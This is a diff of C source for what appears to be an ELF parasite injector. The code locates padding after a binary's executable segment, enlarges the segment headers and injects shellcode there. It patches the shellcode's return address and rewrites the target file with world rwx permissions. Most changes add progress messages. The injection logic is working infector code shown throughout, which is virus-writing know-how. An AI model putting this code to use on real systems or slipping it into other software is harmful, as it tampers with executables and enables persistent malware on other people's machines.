@@ -14,54 +14,33 @@
 #include <sys/user.h>
 
 #define DEBUG
+#define PRINT
 
-/* patch return address of the shellcode */
-static int shellcode_patch_ret_address(struct Shellcode *this,  \
-    Elf64_Addr addr)
+static int shellcode_patch_ret_address(struct Shellcode *this, Elf64_Addr addr)
 {
-    /* converting int to int array */
-    char buf[16];
-    int address[16];
-
-    sprintf(buf, "%lx", addr);
-    for (int i = 0; i < 16; i++){
-        if(buf[i] >= 0x61 && buf[i] <= 0x66)
-            address[i] = buf[i] - 87;
-
-        else if(buf[i] >= 0x30 && buf[i] <= 0x39)
-            address[i] = buf[i] - 48;
-
-        else
-            goto err;
-    }
-
+#ifdef PRINT
+    printf("[!] Replacing return address of the shellcode\n");
+#endif
+#ifdef DEBUG
     for (int i = 0; i < this->m_shellcode_size; i++){
-
-#ifdef DEBUG
-        printf("shellcode %x\n", this->m_shellcode[i]);
+        printf("%x\t", this->m_shellcode[i]);
+    }
 #endif
-        if (this->m_shellcode[i] == 0x99 && this->m_shellcode   \
-                [i + 1] == 0x55){
-
+    puts("......\n");
+    for (int i = 0; i < this->m_shellcode_size; i++)
+    {
+        if(this->m_shellcode[i] == 0x34 && this->m_shellcode[i + 1] == 0x12){
+            *((uint32_t *)((void *)(this->m_shellcode + i))) = addr;
+            printf("\n..%x..\n", *((uint32_t *)((void *)(this->m_shellcode + i))));
 #ifdef DEBUG
-            printf("signature found\n");
-            printf("replacing address with entry point %lx\n",  \
-                addr);
-#endif
-            for (int j = 0; j < 16 && i < this->m_shellcode_size \
-                    ; j++, i++){
-                this->m_shellcode[i] = address[j];
+            for (int i = 0; i < this->m_shellcode_size; i++){
+                printf("%x\t", this->m_shellcode[i]);
             }
-
+#endif
             return 0;
         }
     }
 
-err:
-
-#ifdef DEBUG
-    printf("an error occured while patching shellcode");
-#endif
     return -1;
 }
 
@@ -75,7 +54,7 @@ static int shellcode_extract_section(Shellcode *this, int index)
     if(this->m_shellcode == NULL){
 
 #ifdef DEBUG
-        fprintf(stderr, "memory allocation failed\n");
+        fprintf(stderr, "[ERROR] memory allocation failed\n");
 #endif
         return -1;
     }
@@ -94,13 +73,16 @@ static int shellcode_extract_section(Shellcode *this, int index)
 
 static int target_save_file(Target *this)
 {
+#ifdef PRINT
+    printf("[!] Saving target file back to disk...\n");
+#endif
     /* removing file */
     if(remove(this->m_elf->m_filename) < 0)
         goto err;
 
     /* create a new file with the same name */
-    int out = open(this->m_elf->m_filename, O_WRONLY | O_CREAT  \
-            | O_TRUNC, 0x664);
+    int out = open(this->m_elf->m_filename, O_RDWR | O_CREAT  \
+            | O_TRUNC, S_IRWXO | S_IRWXU | S_IRWXG);
     if(out < 0){
         goto err;
     }
@@ -113,6 +95,9 @@ static int target_save_file(Target *this)
     ssize_t written = 0;
     void *buffer = this->m_elf->m_map;
 
+#ifdef PRINT
+    printf("[!] Writing new target...\n");
+#endif
     /* write to new file */
     while(size != 0 && (written = write(out, buffer, size))     \
         != 0){
@@ -121,7 +106,7 @@ static int target_save_file(Target *this)
                 continue;
 
 #ifdef DEBUG
-            fprintf(stderr, "error writing to file\n");
+            fprintf(stderr, "[ERROR] Write failed\n");
 #endif
             goto err;
         }
@@ -129,7 +114,9 @@ static int target_save_file(Target *this)
         size -= written;
         buffer += written;
     }
-
+#ifdef PRINT
+    printf("[!] finished writing. closing file...\n");
+#endif
     close(out);
 err:
     return -1;
@@ -139,15 +126,24 @@ err:
 static void target_insert_shellcode(Target *this, Shellcode     \
         *shellcode)
 {
+#ifdef PRINT
+    printf("[!] injecting shellcode at offset %lx\n", this->text_end);
+#endif
     for(int i = 0; i < shellcode->m_shellcode_size; i++){
         this->m_elf->m_map[this->text_end + i] = shellcode->    \
             m_shellcode[i];
     }
+#ifdef PRINT
+    printf("[!] finished injecting.\n");
+#endif
 }
 
 /* to adjust section headers and other offsets */
 static void target_adjust_sections(Target *this, int parasite_size)
 {
+#ifdef PRINT
+    printf("[!] Adjusting section information...");
+#endif
     for(int i = 0; i < this->m_elf->m_ehdr->e_shnum; i++){
 
         /* 
@@ -160,43 +156,55 @@ static void target_adjust_sections(Target *this, int parasite_size)
                 [i].sh_size == this->parasite_addr)
             this->m_elf->m_shdr[i].sh_size += parasite_size;
     }
+#ifdef PRINT
+    printf("[!] Finished adjusting section info\n");
+#endif
 }
 
 /* find free space in target binary */
 static int target_find_free_space(Target *this, int parasite_size)
 {
+#ifdef PRINT
+    printf("[!] Searching for free space...\n");
+#endif
     bool text_found = false;
     for(int i = 0;i < this->m_elf->m_ehdr->e_phnum; i++){
-
-#ifdef DEBUG
-        printf("%d\n", i);
-#endif
         if(this->m_elf->m_phdr[i].p_type == PT_LOAD && this->   \
             m_elf->m_phdr[i].p_flags == (PF_R | PF_X)){
 
-#ifdef DEBUG
-            printf("%d text segment found\n", i);
+#ifdef PRINT
+            printf("[!] .text segment found at shdr index %d address \
+                %lx offset %ld\n", i, this->m_elf->m_phdr[i].p_vaddr,  \
+                this->m_elf->m_phdr[i].p_offset);
 #endif
             this->text_filesize = this->m_elf->m_phdr[i].p_filesz;
             this->text_end = this->m_elf->m_phdr[i].p_offset +  \
                 this->text_filesize;
             this->parasite_addr = this->m_elf->m_phdr[i].       \
                 p_vaddr + this->text_filesize;
-
             /* resizing p_filesz and p_memsz */
             this->m_elf->m_phdr[i].p_filesz += parasite_size;
             this->m_elf->m_phdr[i].p_memsz += parasite_size;
             text_found = true;
 
+#ifdef PRINT
+            printf("[!] Parasite start at address %lx\n", this->parasite_addr);
+            printf("[!] Parasite start at offset %ld\n", this->text_end);
+#endif
+
         } else {
             if (this->m_elf->m_phdr[i].p_type == PT_LOAD && (   \
                     this->m_elf->m_phdr[i].p_offset - this->    \
                     text_end)>= parasite_size && text_found){
+#ifdef PRINT
+                printf("[!] .data segment found at index %d address %lx offset %ld\n",
+                    i, this->m_elf->m_phdr[i].p_vaddr, this->m_elf->m_phdr[i]. p_offset);
+#endif
                 this->available_freespace = this->m_elf->m_phdr \
                     [i].p_offset - this->text_end;
 
-#ifdef DEBUG
-                printf("segment found with a gap of %d\n",      \
+#ifdef PRINT
+                printf("[!] Segments found with a gap of %d\n",      \
                         this->available_freespace);
 #endif
                 text_found = false;
@@ -224,7 +232,9 @@ static int elf_get_section_index_by_name(Elf *this, const char  \
     for(int i = 0; i < this->m_ehdr->e_shnum; i++){
         if(strcmp(&shstrtab[this->m_shdr[i].sh_name],            \
                     section_name) == 0){
-            printf("%s section found\n", section_name);
+#ifdef PRINT
+            printf("[!] %s section found at index %d\n", section_name, i);
+#endif
             return i;
         }
     }
@@ -246,7 +256,7 @@ static bool elf_is_elf(Elf *this)
     if(this->m_map == NULL){
 
 #ifdef DEBUG
-        fprintf(stderr, "file not mapped\n");
+        fprintf(stderr, "[ERROR] File not mapped\n");
 #endif
         goto err;
     }
@@ -255,7 +265,7 @@ static bool elf_is_elf(Elf *this)
         this->m_map[2] != 'L' || this->m_map[3] != 'F'){
 
 #ifdef DEBUG
-        fprintf(stderr, "not an elf binary\n");
+        fprintf(stderr, "[ERROR] Not an elf binary\n");
 #endif
         goto err;
     }
@@ -271,7 +281,7 @@ static int elf_init_file(Elf *this)
     if(this->m_filename == NULL){
 
 #ifdef DEBUG
-        fprintf(stderr, "filename not specified\n");
+        fprintf(stderr, "[ERROR] Filename not specified\n");
 #endif
         goto err;
     }
@@ -285,7 +295,7 @@ static int elf_init_file(Elf *this)
     if(fstat(fd, &st) < 0){
 
 #ifdef DEBUG
-        fprintf(stderr, "fstat failed\n");
+        fprintf(stderr, "[ERROR] fstat failed\n");
 #endif
         goto err1;
     }
@@ -296,7 +306,7 @@ static int elf_init_file(Elf *this)
     if(this->m_map == MAP_FAILED){
 
 #ifdef DEBUG
-        fprintf(stderr, "memory map failed");
+        fprintf(stderr, "[ERROR] memory map failed");
 #endif
         goto err1;
     }
@@ -317,7 +327,7 @@ Elf *ElfConstructor(const char *filename)
     if(elf == NULL){
 
 #ifdef DEBUG
-        fprintf(stderr, "memory allocation failed\n");
+        fprintf(stderr, "[ERROR] memory allocation failed\n");
 #endif
         goto err;
     }
@@ -420,6 +430,9 @@ Shellcode *ShellcodeConstructor(const char *filename)
     shellcode->ShellcodePatchRetAddress = shellcode_patch_ret_address;
     shellcode->ShellcodeExtractText = shellcode_extract_section;
 
+#ifdef DEBUG
+    printf("[!] Shellcode constructed\n");
+#endif
     return shellcode;
 
 err2:
